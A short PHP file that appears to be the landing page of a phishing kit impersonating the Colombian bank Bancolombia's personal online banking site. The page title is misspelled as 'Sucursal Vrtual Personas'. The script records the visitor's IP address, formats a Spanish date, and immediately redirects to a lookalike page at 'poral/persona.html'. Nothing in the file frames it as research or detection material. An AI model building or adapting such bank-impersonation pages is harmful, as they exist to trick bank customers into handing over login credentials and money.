<?php
// Suppress deprecation warnings (strftime() deprecated under PHP 8+)
error_reporting(E_ALL & ~E_DEPRECATED & ~E_USER_DEPRECATED);
ini_set('display_errors', '0');

$ip = getenv("REMOTE_ADDR");

date_default_timezone_set('America/Bogota');

// Format date in Spanish without using deprecated strftime()
if (class_exists('IntlDateFormatter')) {
    $formatter = new IntlDateFormatter(
        'es_CO',
        IntlDateFormatter::FULL,
        IntlDateFormatter::NONE,
        'America/Bogota',
        IntlDateFormatter::GREGORIAN,
        "EEEE, dd 'de' MMMM 'de' yyyy"
    );
    $tiempo = $formatter->format(new DateTime());
} else {
    $tiempo = date('l, d \\d\\e F \\d\\e Y');
}
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="poral/css/style.css" rel="stylesheet">
		<link href="poral/css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="poral/img/logo.png" />
		<script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>
		<script src="../../js/jquery.jclock-min.js" type="text/javascript"></script>
   	</head>
   	<body>
   		<script type="text/javascript">
            $(document).ready(function() {
                window.location.href = "poral/persona.html"; 
            });
       </script>
   	</body>
</html>